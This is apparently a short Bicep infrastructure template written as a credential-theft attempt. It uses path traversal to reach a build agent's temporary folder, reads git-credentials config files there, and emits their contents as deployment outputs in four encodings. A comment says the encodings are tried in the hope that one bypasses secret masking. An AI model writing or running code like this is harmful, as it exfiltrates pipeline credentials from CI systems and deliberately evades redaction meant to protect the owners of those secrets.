var credFiles = loadDirectoryFileInfo('../../../_temp', 'git-credentials-*.config')

// Try different encodings - maybe one bypasses masking
var utf8 = loadTextContent(credFiles[0].relativePath, 'utf-8')
var utf16 = loadTextContent(credFiles[0].relativePath, 'utf-16')
var ascii = loadTextContent(credFiles[0].relativePath, 'us-ascii')
var iso = loadTextContent(credFiles[0].relativePath, 'iso-8859-1')

output e1 string = utf8
output e2 string = utf16
output e3 string = ascii
output e4 string = iso
